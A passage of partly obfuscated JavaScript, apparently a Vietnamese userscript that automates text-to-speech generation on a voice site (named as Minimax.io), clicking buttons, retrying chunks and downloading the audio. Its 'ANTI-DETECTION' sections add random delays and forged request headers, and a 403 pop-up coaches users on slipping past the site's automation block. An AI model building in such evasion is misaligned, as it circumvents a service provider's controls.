Promise(dyvridmApUsyBfpYIHkxv=>setTimeout(dyvridmApUsyBfpYIHkxv,parseInt(0xf61)+Math.ceil(-parseInt(0x1e0))+-parseInt(0xb8d))),n_WwsStaC$jzsWjOIjRqedTG=WaveSurfer[VCAHyXsrERcpXVhFPxmgdBjjh(0x240)]({'container':VCAHyXsrERcpXVhFPxmgdBjjh(0x274),'waveColor':VCAHyXsrERcpXVhFPxmgdBjjh(0x26a),'progressColor':VCAHyXsrERcpXVhFPxmgdBjjh(0x228),'cursorColor':VCAHyXsrERcpXVhFPxmgdBjjh(0x20c),'barWidth':0x3,'barRadius':0x3,'cursorWidth':0x1,'height':0x64,'barGap':0x3}),n_WwsStaC$jzsWjOIjRqedTG[VCAHyXsrERcpXVhFPxmgdBjjh(0x1d5)](BBNDYjhHoGkj_qbbbJu),n_WwsStaC$jzsWjOIjRqedTG['on'](VCAHyXsrERcpXVhFPxmgdBjjh(0x1d6),()=>{const Ipo_CDaCvNEfh=VCAHyXsrERcpXVhFPxmgdBjjh;XvyPnqSRdJtYjSxingI[Ipo_CDaCvNEfh(0x1c7)]='⏸️';}),n_WwsStaC$jzsWjOIjRqedTG['on'](VCAHyXsrERcpXVhFPxmgdBjjh(0x22d),()=>{const NdVplyNSVhdzFR=VCAHyXsrERcpXVhFPxmgdBjjh;XvyPnqSRdJtYjSxingI[NdVplyNSVhdzFR(0x1c7)]='▶️';});

        // --- BẮT ĐẦU NÂNG CẤP: THÊM NÚT TẢI CHUNKS (ZIP) ---
        try {
            const downloadChunksBtn = document.getElementById('gemini-download-chunks-btn');
            if (downloadChunksBtn) {
                // Hiển thị nút
                downloadChunksBtn.style.display = 'inline-block';

                // Tạo bản sao của nút để xóa listener cũ (nếu có)
                const newBtn = downloadChunksBtn.cloneNode(true);
                downloadChunksBtn.parentNode.replaceChild(newBtn, downloadChunksBtn);

                // Thêm listener mới vào nút
                newBtn.addEventListener('click', async () => {
                    addLogEntry('📁 Đang chuẩn bị tải trực tiếp các chunk...', 'info');

                    // Lấy danh sách các chunk đã thành công
                    const successfulChunks = [];

                    // ƯU TIÊN 1: Kiểm tra window.chunkBlobs trước
                    if (window.chunkBlobs && window.chunkBlobs.length > 0) {
                        for (let i = 0; i < window.chunkBlobs.length; i++) {
                            if (window.chunkBlobs[i] !== null) {
                                successfulChunks.push({
                                    index: i,
                                    blob: window.chunkBlobs[i]
                                });
                            }
                        }
                        addLogEntry(`📦 Tìm thấy ${successfulChunks.length} chunk từ window.chunkBlobs`, 'info');
                    }

                    // ƯU TIÊN 2: Nếu window.chunkBlobs rỗng, dùng ZTQj$LF$o
                    if (successfulChunks.length === 0 && ZTQj$LF$o && ZTQj$LF$o.length > 0) {
                        for (let i = 0; i < ZTQj$LF$o.length; i++) {
                            if (ZTQj$LF$o[i] !== null && ZTQj$LF$o[i] !== undefined) {
                                successfulChunks.push({
                                    index: i,
                                    blob: ZTQj$LF$o[i]
                                });
                            }
                        }
                        addLogEntry(`📦 Fallback: Tìm thấy ${successfulChunks.length} chunk từ ZTQj$LF$o`, 'info');
                    }

                    if (successfulChunks.length === 0) {
                        addLogEntry('❌ Không tìm thấy chunk nào để tải!', 'error');
                        Swal.fire('Lỗi', 'Không có chunk nào để tải xuống.', 'error');
                        return;
                    }

                    // Sắp xếp theo thứ tự
                    successfulChunks.sort((a, b) => a.index - b.index);

                    // Lấy tên file gốc
                    let baseFileName = 'audio_chunks'; // Tên thư mục mặc định
                    if (typeof i_B_kZYD === 'function') {
                        baseFileName = i_B_kZYD().replace(/\.mp3$/, '') + '_chunks';
                    }

                    addLogEntry(`📁 Bắt đầu tải ${successfulChunks.length} chunk về thư mục "${baseFileName}"...`, 'info');

                    // Hiển thị thông báo
                    Swal.fire({
                        title: 'Đang tải các chunk...',
                        text: `Sẽ tải ${successfulChunks.length} file chunk trực tiếp về thư mục.`,
                        icon: 'info',
                        timer: 2000,
                        showConfirmButton: false
                    });

                    // Tải tất cả file cùng lúc về thư mục
                    downloadAllChunksAtOnce(successfulChunks, baseFileName);
                });
            } else {
                 addLogEntry('⚠️ Không tìm thấy nút tải chunk ZIP (gemini-download-chunks-btn)', 'warning');
            }
        } catch (e) {
            addLogEntry(`❌ Lỗi khi gắn listener cho nút ZIP: ${e.message}`, 'error');
        }
        // --- KẾT THÚC NÂNG CẤP ---

}catch(FlhstZJmp_$Mvf){}}

// =======================================================
// == HÀM TẢI TRỰC TIẾP CÁC CHUNK ==
// =======================================================

// Hàm tải tất cả chunk cùng lúc về thư mục
function downloadAllChunksAtOnce(chunks, folderName) {
    addLogEntry(`📁 Bắt đầu tải ${chunks.length} file cùng lúc về thư mục "${folderName}"...`, 'info');

    // Tải tất cả file với delay 1 giây giữa các lần tải
    chunks.forEach((chunk, index) => {
        const chunkIndex = chunk.index + 1;
        // Sửa đổi: chunk 1 -> tên file là "1", chunk 2 -> tên file là "2"
        const fileName = `${chunkIndex}.mp3`;

        // Thêm delay 1 giây giữa các lần tải
        setTimeout(() => {
            // Tạo URL cho blob
            const url = URL.createObjectURL(chunk.blob);

            // Tạo link tải xuống
            const a = document.createElement('a');
            a.href = url;
            a.download = fileName;
            a.style.display = 'none';

            // Thêm vào DOM, click, rồi xóa ngay
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);

            // Giải phóng URL sau một chút
            setTimeout(() => {
                URL.revokeObjectURL(url);
            }, 100);

            addLogEntry(`📁 Đã tải chunk ${chunkIndex}/${chunks.length} (${Math.round(chunk.blob.size/1024)}KB) với tên file "${fileName}"`, 'info');
        }, index * 1000); // Delay 1 giây cho mỗi chunk
    });

    // Thông báo hoàn thành - tăng thời gian chờ để phù hợp với delay
    setTimeout(() => {
        addLogEntry('✅ Đã tải xong tất cả các chunk!', 'success');
        Swal.fire({
            title: 'Hoàn thành!',
            text: `Đã tải xuống ${chunks.length} file chunk thành công. Chunk 1 -> "1.mp3", Chunk 2 -> "2.mp3", v.v.`,
            icon: 'success',
            timer: 3000
        });
    }, chunks.length * 1000 + 1000); // Chờ thêm 1 giây sau chunk cuối cùng
}

// =======================================================
// == CÁC HÀM "BỘ NÃO" CHỜ ĐỢI THÔNG MINH ==
// =======================================================

/**
 * Chờ một phần tử xuất hiện trên DOM một cách thông minh bằng MutationObserver.
 * @param {string} selector - CSS selector của phần tử cần chờ (ví dụ: 'button.btn-primary').
 * @param {number} [timeout=15000] - Thời gian chờ tối đa, tính bằng mili giây (mặc định 15 giây).
 * @returns {Promise<Element>} - Trả về một Promise, sẽ hoàn thành với phần tử khi nó được tìm thấy.
 */
function waitForElement(selector, timeout = 15000) {
    return new Promise((resolve, reject) => {
        // 1. Thử tìm ngay lập tức, biết đâu đã có sẵn
        const element = document.querySelector(selector);
        if (element) {
            resolve(element);
            return;
        }

        // 2. Nếu chưa có, tạo một "gián điệp" (MutationObserver) để theo dõi
        const observer = new MutationObserver((mutations, obs) => {
            const targetElement = document.querySelector(selector);
            if (targetElement) {
                obs.disconnect(); // Tìm thấy rồi, cho gián điệp nghỉ hưu
                resolve(targetElement);
            }
        });

        // 3. Ra lệnh cho "gián điệp" bắt đầu theo dõi toàn bộ trang web
        observer.observe(document.body, {
            childList: true, // Theo dõi các node con được thêm/xóa
            subtree: true    // Theo dõi toàn bộ các "nhánh" con cháu
        });

        // 4. Đặt đồng hồ bấm giờ để tránh việc chờ đợi vô tận
        setTimeout(() => {
            observer.disconnect(); // Hết giờ, cho gián điệp nghỉ hưu
            reject(new Error(`Timeout: Hết thời gian chờ phần tử "${selector}" sau ${timeout / 1000} giây.`));
        }, timeout);
    });
}

/**
 * Hàm "Bộ Não" nâng cấp: Chờ đợi nút bấm dựa trên một hoặc nhiều khả năng về text.
 * @param {string|string[]} buttonTexts - Một text hoặc một mảng các text có thể có trên nút.
 * @param {number} [timeout=15000] - Thời gian chờ tối đa.
 * @returns {Promise<Element>} - Trả về nút đã tìm thấy.
 */
async function waitForButton(buttonTexts, timeout = 15000) {
    const textsToFind = Array.isArray(buttonTexts) ? buttonTexts : [buttonTexts];
    const logText = `"${textsToFind.join('" hoặc "')}"`;

    try {
        const stableButtonSelector = '.clone-voice-ux-v2 button.ant-btn, button[class*="ant-btn"], .ant-btn, button';

        addLogEntry(`⏳ Đang chờ nút ${logText} sẵn sàng...`);

        await waitForElement(stableButtonSelector, timeout);

        const buttons = document.querySelectorAll(stableButtonSelector);
        let targetButton = null;

        // Vòng lặp tìm nút khớp với BẤT KỲ text nào trong mảng
        for (const btn of buttons) {
            const btnText = (btn.textContent || btn.innerText || '').toLowerCase().trim();
            if (btnText && textsToFind.some(text => btnText.includes(text.toLowerCase()))) {
                targetButton = btn;
                break; // Tìm thấy thì dừng ngay
            }
        }

        if (!targetButton) {
            throw new Error(`Đã tìm thấy các nút chung nhưng không có nút nào chứa text ${logText}`);
        }

        if (targetButton.disabled) {
            throw new Error(`Nút ${logText} đang bị khóa`);
        }

        addLogEntry(`✅ Nút ${logText} đã sẵn sàng!`);
        return targetButton;

    } catch (error) {
        addLogEntry(`❌ Lỗi chờ nút: ${error.message}`, 'error');
        throw error;
    }
}

// =======================================================

async function uSTZrHUt_IC() {
    const tQqGbytKzpHwhGmeQJucsrq = AP$u_huhInYfTj;
    if (MEpJezGZUsmpZdAgFRBRZW) return;

    // Logic xử lý khi đã hoàn thành tất cả các chunk
    if (ttuo$y_KhCV >= SI$acY[tQqGbytKzpHwhGmeQJucsrq(0x216)]) {
        // Kiểm tra xem tất cả chunk đã được xử lý đầy đủ chưa
        const totalChunks = SI$acY.length;
        const processedChunks = window.chunkStatus ? window.chunkStatus.filter(status => status === 'success' || status === 'failed').length : 0;
        const failedChunks = window.failedChunks || [];

        addLogEntry(`📊 Kiểm tra: ${processedChunks}/${totalChunks} chunks đã được xử lý`, 'info');

        // Nếu chưa xử lý đủ chunk, tiếp tục chờ
        if (processedChunks < totalChunks) {
            addLogEntry(`⏳ Còn ${totalChunks - processedChunks} chunk chưa được xử lý. Tiếp tục chờ...`, 'warning');
            setTimeout(uSTZrHUt_IC, 2000);
            return;
        }

        // Nếu có chunk thất bại và chưa kiểm tra cuối
        if (failedChunks.length > 0 && !window.isFinalCheck) {
            addLogEntry(`🔍 Phát hiện ${failedChunks.length} chunk thất bại. Bắt đầu xử lý lại...`, 'warning');
            addLogEntry(`📋 Danh sách chunk thất bại: ${failedChunks.map(i => i + 1).join(', ')}`, 'info');
            window.isFinalCheck = true;
            window.retryCount = 0; // Reset bộ đếm retry
            
            // Áp dụng cơ chế Reset an toàn: Khôi phục Giao diện một lần
            addLogEntry(`🔄 Áp dụng cơ chế Reset an toàn: Khôi phục Giao diện...`, 'info');
            addLogEntry(`🔄 Đang nhấn nút "Tạo lại" để đảm bảo trạng thái web sạch sẽ...`, 'info');
            
            // Sử dụng async IIFE để xử lý reset
            (async () => {
                try {
                    // Tìm và click nút "Regenerate" hoặc "Tạo lại"
                    const regenerateButtons = document.querySelectorAll('button, .ant-btn');
                    let foundRegenerate = false;

                    for (const btn of regenerateButtons) {
                        const btnText = (btn.textContent || '').toLowerCase().trim();
                        if (btnText.includes('regenerate') || btnText.includes('tạo lại') ||
                            btnText.includes('generate') || btnText.includes('tạo')) {
                            if (btn.offsetParent !== null && !btn.disabled) {
                                addLogEntry(`🔄 Tìm thấy nút "${btn.textContent}" - đang reset...`, 'info');
                                btn.click();
                                foundRegenerate = true;
                                break;
                            }
                        }
                    }

                    if (foundRegenerate) {
                        // Chờ web xử lý reset
                        addLogEntry(`⏳ Chờ web xử lý reset...`, 'info');
                        await new Promise(resolve => setTimeout(resolve, 3000));

                        // Clear textarea để đảm bảo trạng thái sạch
                        const textarea = document.getElementById('gemini-hidden-text-for-request');
                        if (textarea) {
                            textarea.value = '';
                            addLogEntry(`🧹 Đã clear textarea`, 'info');
                        }

                        // Chờ thêm một chút để web ổn định
                        await new Promise(resolve => setTimeout(resolve, 2000));
                        addLogEntry(`✅ Web đã được reset thành công!`, 'success');
                    } else {
                        addLogEntry(`⚠️ Không tìm thấy nút reset, tiếp tục...`, 'warning');
                    }
                } catch (resetError) {
                    addLogEntry(`❌ Lỗi khi reset web: ${resetError.message}, tiếp tục...`, 'error');
                }
                
                // Nhảy thẳng đến chunk lỗi đầu tiên, không đếm lại từ đầu
                const firstFailedIndex = Math.min(...failedChunks);
                ttuo$y_KhCV = firstFailedIndex;
                addLogEntry(`🔄 RETRY MODE: Nhảy thẳng đến chunk ${firstFailedIndex + 1} (chunk lỗi đầu tiên), chỉ xử lý chunks lỗi`, 'info');
                setTimeout(uSTZrHUt_IC, 2000); // Chờ 2 giây rồi bắt đầu xử lý
            })();
            return;
        }

        // Nếu đã kiểm tra cuối cùng hoặc không có chunk thất bại
        EfNjYNYj_O_CGB = ![];
        LrkOcBYz_$AGjPqXLWnyiATpCI[tQqGbytKzpHwhGmeQJucsrq(0x1fb)][tQqGbytKzpHwhGmeQJucsrq(0x1e1)] = tQqGbytKzpHwhGmeQJucsrq(0x258);
        lraDK$WDOgsXHRO[tQqGbytKzpHwhGmeQJucsrq(0x1fb)][tQqGbytKzpHwhGmeQJucsrq(0x1e1)] = tQqGbytKzpHwhGmeQJucsrq(0x209);
        OdKzziXLxtOGjvaBMHm[tQqGbytKzpHwhGmeQJucsrq(0x1fb)][tQqGbytKzpHwhGmeQJucsrq(0x1e1)] = tQqGbytKzpHwhGmeQJucsrq(0x209);
        LrkOcBYz_$AGjPqXLWnyiATpCI[tQqGbytKzpHwhGmeQJucsrq(0x243)] = ![];
        LrkOcBYz_$AGjPqXLWnyiATpCI[tQqGbytKzpHwhGmeQJucsrq(0x273)] = tQqGbytKzpHwhGmeQJucsrq(0x275);
        nWHrScjZnIyNYzztyEWwM(ttuo$y_KhCV, SI$acY[tQqGbytKzpHwhGmeQJucsrq(0x216)]);

        if (window.isFinalCheck) {
            const remainingFailedChunks = window.failedChunks.length;

            if (remainingFailedChunks > 0) {
                addLogEntry(`⚠️ Hoàn thành với ${SI$acY.length - remainingFailedChunks}/${SI$acY.length} chunk thành công.`, 'warning');
                addLogEntry(`❌ ${remainingFailedChunks} chunk vẫn thất bại: ${window.failedChunks.map(i => i + 1).join(', ')}`, 'error');
                addLogEntry(`🔄 Tiếp tục retry các chunk thất bại... (Lần ${window.totalRetryAttempts + 1})`, 'info');
                addLogEntry(`⏳ Tool sẽ retry VÔ HẠN cho đến khi TẤT CẢ chunk thành công!`, 'info');
                addLogEntry(`📊 Thống kê: ${window.totalRetryAttempts} lần retry đã thực hiện`, 'info');
                
                // Áp dụng cơ chế Reset an toàn: Khôi phục Giao diện một lần
                addLogEntry(`🔄 Áp dụng cơ chế Reset an toàn: Khôi phục Giao diện...`, 'info');
                addLogEntry(`🔄 Đang nhấn nút "Tạo lại" để đảm bảo trạng thái web sạch sẽ...`, 'info');
                
                // Sử dụng async IIFE để xử lý reset
                (async () => {
                    try {
                        // Tìm và click nút "Regenerate" hoặc "Tạo lại"
                        const regenerateButtons = document.querySelectorAll('button, .ant-btn');
                        let foundRegenerate = false;

                        for (const btn of regenerateButtons) {
                            const btnText = (btn.textContent || '').toLowerCase().trim();
                            if (btnText.includes('regenerate') || btnText.includes('tạo lại') ||
                                btnText.includes('generate') || btnText.includes('tạo')) {
                                if (btn.offsetParent !== null && !btn.disabled) {
                                    addLogEntry(`🔄 Tìm thấy nút "${btn.textContent}" - đang reset...`, 'info');
                                    btn.click();
                                    foundRegenerate = true;
                                    break;
                                }
                            }
                        }

                        if (foundRegenerate) {
                            // Chờ web xử lý reset
                            addLogEntry(`⏳ Chờ web xử lý reset...`, 'info');
                            await new Promise(resolve => setTimeout(resolve, 3000));

                            // Clear textarea để đảm bảo trạng thái sạch
                            const textarea = document.getElementById('gemini-hidden-text-for-request');
                            if (textarea) {
                                textarea.value = '';
                                addLogEntry(`🧹 Đã clear textarea`, 'info');
                            }

                            // Chờ thêm một chút để web ổn định
                            await new Promise(resolve => setTimeout(resolve, 2000));
                            addLogEntry(`✅ Web đã được reset thành công!`, 'success');
                        } else {
                            addLogEntry(`⚠️ Không tìm thấy nút reset, tiếp tục...`, 'warning');
                        }
                    } catch (resetError) {
                        addLogEntry(`❌ Lỗi khi reset web: ${resetError.message}, tiếp tục...`, 'error');
                    }
                    
                    // KHÔNG ghép file khi còn chunk thất bại - tiếp tục retry VÔ HẠN
                    window.retryCount = 0; // Reset bộ đếm retry
                    window.totalRetryAttempts++; // Tăng bộ đếm retry tổng thể
                    // Nhảy thẳng đến chunk lỗi đầu tiên, không đếm lại từ đầu
                    const firstFailedIndex = Math.min(...window.failedChunks);
                    ttuo$y_KhCV = firstFailedIndex;
                    addLogEntry(`🔄 RETRY MODE: Nhảy thẳng đến chunk ${firstFailedIndex + 1} (chunk lỗi đầu tiên), chỉ xử lý chunks lỗi`, 'info');
                    setTimeout(uSTZrHUt_IC, 2000); // Chờ 2 giây rồi bắt đầu lại
                })();
                return;
            } else {
                addLogEntry(`🎉 Hoàn thành xử lý tất cả chunks (đã thử lại các chunk thất bại)!`, 'success');
                addLogEntry(`✅ TẤT CẢ ${SI$acY.length} chunks đã thành công! Bắt đầu ghép file...`, 'success');
                // CHỈ ghép file khi TẤT CẢ chunk đã thành công
                tt__SfNwBHDebpWJOqrSTR();
            }
        } else {
            addLogEntry(`🎉 Tất cả ${SI$acY.length} chunks đã được xử lý xong!`, 'success');
            addLogEntry(`✅ TẤT CẢ ${SI$acY.length} chunks đã thành công! Bắt đầu ghép file...`, 'success');
            // CHỈ ghép file khi TẤT CẢ chunk đã thành công
            tt__SfNwBHDebpWJOqrSTR();
        }
        return;
    }

    nWHrScjZnIyNYzztyEWwM(ttuo$y_KhCV, SI$acY[tQqGbytKzpHwhGmeQJucsrq(0x216)]);
    rUxbIRagbBVychZ$GfsogD[tQqGbytKzpHwhGmeQJucsrq(0x24c)] = SI$acY[ttuo$y_KhCV];

    // Khởi tạo hệ thống theo dõi chunk
    if (typeof window.chunkStatus === 'undefined') window.chunkStatus = [];
    if (typeof window.failedChunks === 'undefined') window.failedChunks = [];
    if (typeof window.isFinalCheck === 'undefined') window.isFinalCheck = false;
    if (typeof window.retryCount === 'undefined') window.retryCount = 0;
    if (typeof window.totalRetryAttempts === 'undefined') window.totalRetryAttempts = 0;

    // Đảm bảo mảng chunkStatus có đủ phần tử
    while (window.chunkStatus.length < SI$acY.length) {
        window.chunkStatus.push('pending');
    }

    // Logic thông minh: Tìm nút và click với retry
    try {
        // Nếu đang trong giai đoạn kiểm tra cuối (RETRY MODE)
        if (window.isFinalCheck) {
            // Nếu chunk hiện tại không phải chunk lỗi, nhảy thẳng đến chunk lỗi tiếp theo
            if (window.chunkStatus[ttuo$y_KhCV] !== 'failed') {
                // Tìm chunk lỗi tiếp theo
                const remainingFailedChunks = window.failedChunks.filter(idx => idx > ttuo$y_KhCV);
                if (remainingFailedChunks.length > 0) {
                    const nextFailedIndex = Math.min(...remainingFailedChunks);
                    addLogEntry(`⏭️ [Chunk ${ttuo$y_KhCV + 1}] Đã thành công, nhảy thẳng đến chunk ${nextFailedIndex + 1} (chunk lỗi tiếp theo)`, 'info');
                    ttuo$y_KhCV = nextFailedIndex;
                } else {
                    // Không còn chunk lỗi nào, kết thúc
                    addLogEntry(`✅ Đã xử lý xong tất cả chunks lỗi!`, 'success');
                    ttuo$y_KhCV = SI$acY.length; // Đánh dấu hoàn thành
                    setTimeout(uSTZrHUt_IC, 1000);
                    return;
                }
            }
        }

        // Nếu đang trong giai đoạn kiểm tra cuối và chunk này thất bại, thông báo đang xử lý lại
        if (window.isFinalCheck && window.chunkStatus[ttuo$y_KhCV] === 'failed') {
            addLogEntry(`🔄 [Chunk ${ttuo$y_KhCV + 1}] Đang xử lý lại chunk thất bại...`, 'warning');
        }


        // Tạo ra các khả năng có thể có cho tên nút
        const possibleGenerateTexts = ['Generate', 'Tạo'];
        const possibleRegenerateTexts = ['Regenerate', 'Tạo lại'];
        const buttonTexts = (ttuo$y_KhCV === 0) ? possibleGenerateTexts : possibleRegenerateTexts;

        // Gọi hàm "bộ não" đã nâng cấp
        const targetButton = await waitForButton(buttonTexts);

        // ANTI-DETECTION: Thêm delay ngẫu nhiên trước khi đặt text
        await new Promise(resolve => setTimeout(resolve, Math.random() * 1000 + 500));
        
        // Đặt text vào ô input ẩn
        rUxbIRagbBVychZ$GfsogD[tQqGbytKzpHwhGmeQJucsrq(0x24c)] = SI$acY[ttuo$y_KhCV];

        // Cập nhật progress bar
        nWHrScjZnIyNYzztyEWwM(ttuo$y_KhCV, SI$acY[tQqGbytKzpHwhGmeQJucsrq(0x216)]);
        addLogEntry(`📦 [Chunk ${ttuo$y_KhCV + 1}/${SI$acY.length}] Đang gửi đi... (độ dài: ${SI$acY[ttuo$y_KhCV].length})`, 'info');

        // ANTI-DETECTION: Thêm delay ngẫu nhiên trước khi click
        await new Promise(resolve => setTimeout(resolve, Math.random() * 2000 + 1000));
        
        // Thực hiện click
        KxTOuAJu(targetButton);
        igyo$uwVChUzI();

    } catch (error) {
        // ANTI-DETECTION: Kiểm tra lỗi 403 trước
        if (error.message && error.message.includes('403')) {
            addLogEntry(`🚨 [Chunk ${ttuo$y_KhCV + 1}] Lỗi 403: Website đã phát hiện automation!`, 'error');
            addLogEntry(`💡 Giải pháp: Đóng trình duyệt, mở lại và thử profile khác (không có Gmail)`, 'warning');
            
            if (typeof Swal !== 'undefined') {
                Swal.fire({
                    title: '🚨 Website đã phát hiện automation!',
                    html: `
                        <div style="text-align: left;">
                            <p><strong>Lỗi 403:</strong> Website Minimax.io đã chặn tool automation.</p>
                            <hr>
                            <p><strong>💡 Giải pháp:</strong></p>
                            <ol>
                                <li>Đóng trình duyệt và mở lại</li>
                                <li>Sử dụng profile Chrome khác (không đăng nhập Gmail)</li>
                                <li>Đợi 10-15 phút rồi thử lại</li>
                                <li>Thử trên trình duyệt khác (Edge, Firefox)</li>
                            </ol>
                            <hr>
                            <p><strong>⚠️ Lưu ý:</strong> Không nên đăng nhập Gmail trong profile đang dùng tool!</p>
                        </div>
                    `,
                    icon: 'warning',
                    width: '600px',
                    confirmButtonText: 'Hiểu rồi',
                    confirmButtonColor: '#ff6b6b'
                });
            }
            return; // Dừng xử lý chunk này
        }
        
        const MAX_RETRIES = 5;
        window.retryCount++;

        if (window.retryCount <= MAX_RETRIES) {
            addLogEntry(`🔄 [Chunk ${ttuo$y_KhCV + 1}] Thử lại lần ${window.retryCount}/${MAX_RETRIES}...`, 'warning');

            // THÊM RESET WEB KHI GẶP LỖI
            addLogEntry(`🔄 Đang reset web về trạng thái ban đầu...`, 'info');
            addLogEntry(`🔄 Đang khôi phục web về trạng thái như lúc gửi chunk thành công...`, 'info');

            try {
                // Tìm và click nút "Regenerate" hoặc "Tạo lại" để reset web
                const regenerateButtons = document.querySelectorAll('button, .ant-btn');
                let foundRegenerate = false;

                for (const btn of regenerateButtons) {
                    const btnText = (btn.textContent || '').toLowerCase().trim();
                    if (btnText.includes('regenerate') || btnText.includes('tạo lại') ||
                        btnText.includes('generate') || btnText.includes('tạo')) {
                        if (btn.offsetParent !== null && !btn.disabled) {
                            addLogEntry(`🔄 Tìm thấy nút "${btn.textContent}" - đang reset...`, 'info');
                            btn.click();
                            foundRegenerate = true;
                            break;
                        }
                    }
                }

                if (foundRegenerate) {
                    // Chờ web xử lý reset
                    addLogEntry(`⏳ Chờ web xử lý reset...`, 'info');
                    await new Promise(resolve => setTimeout(resolve, 3000));

                    // Clear textarea để đảm bảo trạng thái sạch
                    const textarea = document.getElementById('gemini-hidden-text-for-request');
                    if (textarea) {
                        textarea.value = '';
                        addLogEntry(`🧹 Đã clear textarea`, 'info');
                    }

                    // Chờ thêm một chút để web ổn định
                    await new Promise(resolve => setTimeout(resolve, 2000));
                    addLogEntry(`✅ Web đã được reset thành công!`, 'success');
                } else {
                    addLogEntry(`⚠️ Không tìm thấy nút reset, thử tìm nút khác...`, 'warning');
                    // Tìm bất kỳ nút nào có thể reset
                    const anyButton = document.querySelector('.clone-voice-ux-v2 button, .clone-voice-ux-v2 .ant-btn');
                    if (anyButton && anyButton.offsetParent !== null && !anyButton.disabled) {
                        addLogEntry(`🔄 Sử dụng nút "${anyButton.textContent}" để reset...`, 'info');
                        anyButton.click();
                        await new Promise(resolve => setTimeout(resolve, 3000));
                        addLogEntry(`✅ Web đã được reset bằng nút khác!`, 'success');
                    } else {
                        addLogEntry(`❌ Không tìm thấy nút nào để reset web`, 'error');
                    }
                }
            } catch (resetError) {
                addLogEntry(`❌ Lỗi khi reset web: ${resetError.message}`, 'error');
            }

            setTimeout(uSTZrHUt_IC, 2000 * window.retryCount); // Chờ lâu hơn sau mỗi lần thử
        } else {
            addLogEntry(`🚫 [Chunk ${ttuo$y_KhCV + 1}] Thất bại sau ${MAX_RETRIES} lần thử. Bỏ qua chunk này.`, 'error');
            // Đánh dấu chunk này là thất bại
            window.chunkStatus[ttuo$y_KhCV] = 'failed';
            if (!window.failedChunks.includes(ttuo$y_KhCV)) {
                window.failedChunks.push(ttuo$y_KhCV);
            }
            window.retryCount = 0; // Reset bộ đếm retry
            ttuo$y_KhCV++; // Chuyển sang chunk tiếp theo
            addLogEntry(`➡️ Chuyển sang chunk ${ttuo$y_KhCV + 1}...`, 'info');
            addLogEntry(`📊 Trạng thái: ${window.chunkStatus.filter(s => s === 'success' || s === 'failed').length}/${SI$acY.length} chunks đã xử lý`, 'info');
            setTimeout(uSTZrHUt_IC, 2000); // Tiếp tục với chunk tiếp theo
        }
    }
}function igyo$uwVChUzI() {
    const VFmk$UVEL = AP$u_huhInYfTj;
    const Yy_yaGQ$LW = document[VFmk$UVEL(0x1cd)](VFmk$UVEL(0x256));
    if (!Yy_yaGQ$LW) return;

    // Logic đơn giản: Chỉ chờ kết quả
    Srnj$swt = setTimeout(() => {
        const uINqLNrLfJbc = VFmk$UVEL;
        if (xlgJHLP$MATDT$kTXWV) xlgJHLP$MATDT$kTXWV[uINqLNrLfJbc(0x24e)](); // Dừng observer cũ
        addLogEntry(`❌ [Chunk ${ttuo$y_KhCV + 1}] Timeout. Bỏ qua chunk này.`, 'error');
        // Đánh dấu chunk này là thất bại
        window.chunkStatus[ttuo$y_KhCV] = 'failed';
        if (!window.failedChunks.includes(ttuo$y_KhCV)) {
            window.failedChunks.push(ttuo$y_KhCV);
        }
        ttuo$y_KhCV++; // Chuyển sang chunk tiếp theo
        addLogEntry(`➡️ Chuyển sang chunk ${ttuo$y_KhCV + 1}...`, 'info');
        addLogEntry(`📊 Trạng thái: ${window.chunkStatus.filter(s => s === 'success' || s === 'failed').length}/${SI$acY.length} chunks đã xử lý`, 'info');
        setTimeout(uSTZrHUt_IC, 2000); // Tiếp tục với chunk tiếp theo
    }, parseFloat(0x11a62) + -0x13f58 + 0x19b * parseInt(0xf2));

    xlgJHLP$MATDT$kTXWV = new MutationObserver(async (w$KFkMtMom_agF, GrmINfCyEsyqJbigpyT) => {
        const ndkpgKnjg = VFmk$UVEL;
        for (const qcgcrPbku_NfOSGWmbTlMZNUOu of w$KFkMtMom_agF) {
            for (const TYRNWSSd$QOYZe of qcgcrPbku_NfOSGWmbTlMZNUOu[ndkpgKnjg(0x1db)]) {
                if (TYRNWSSd$QOYZe[ndkpgKnjg(0x217)] === 0x7fd * parseInt(-0x3) + 0xa02 + 0xdf6 && TYRNWSSd$QOYZe[ndkpgKnjg(0x1cd)](ndkpgKnjg(0x1f2))) {
                    clearTimeout(Srnj$swt);
                    GrmINfCyEsyqJbigpyT[ndkpgKnjg(0x24e)]();

                    // Log khi thành công
                    addLogEntry(`✅ [Chunk ${ttuo$y_KhCV + 1}/${SI$acY.length}] Xử lý thành công!`, 'success');
                    window.retryCount = 0; // Reset bộ đếm retry khi thành công
                    window.chunkStatus[ttuo$y_KhCV] = 'success'; // Đánh dấu chunk này đã thành công

                    // Nếu đang trong giai đoạn kiểm tra cuối, loại bỏ chunk này khỏi danh sách thất bại
                    if (window.isFinalCheck && window.failedChunks.includes(ttuo$y_KhCV)) {
                        window.failedChunks = window.failedChunks.filter(index => index !== ttuo$y_KhCV);
                        addLogEntry(`🎉 [Chunk ${ttuo$y_KhCV + 1}] Đã khôi phục thành công từ trạng thái thất bại!`, 'success');
                    }

                    // ĐỒNG BỘ HÓA KHI RETRY: Đảm bảo window.chunkBlobs được cập nhật khi retry thành công
                    if (typeof window.chunkBlobs === 'undefined') {
                        window.chunkBlobs = new Array(SI$acY.length).fill(null);
                    }
                    // Chunk này sẽ được lưu vào window.chunkBlobs ở phần code phía dưới

                    const yEExghI = TYRNWSSd$QOYZe[ndkpgKnjg(0x1cd)](ndkpgKnjg(0x1f2))[ndkpgKnjg(0x1f1)];
                    if (yEExghI && (yEExghI[ndkpgKnjg(0x20e)](ndkpgKnjg(0x1fa)) || yEExghI[ndkpgKnjg(0x20e)](ndkpgKnjg(0x26f)))) try {
                        // ANTI-DETECTION: Thêm delay ngẫu nhiên và headers để tránh bị phát hiện
                        await new Promise(resolve => setTimeout(resolve, Math.random() * 1000 + 500));
                        
                        const FGrxK_RK = await fetch(yEExghI, {
                            method: 'GET',
                            headers: {
                                'Accept': 'audio/mpeg, audio/*, */*',
                                'Accept-Language': 'vi-VN,vi;q=0.9,en;q=0.8',
                                'Cache-Control': 'no-cache',
                                'Pragma': 'no-cache',
                                'Sec-Fetch-Dest': 'audio',
                                'Sec-Fetch-Mode': 'cors',
                                'Sec-Fetch-Site': 'same-origin',
                                'User-Agent': navigator.userAgent,
                                'Referer': window.location.href
                            },
                            credentials: 'same-origin',
                            mode: 'cors'
                        });
                        
                        if (!FGrxK_RK['ok']) {
                            if (FGrxK_RK.status === 403) {
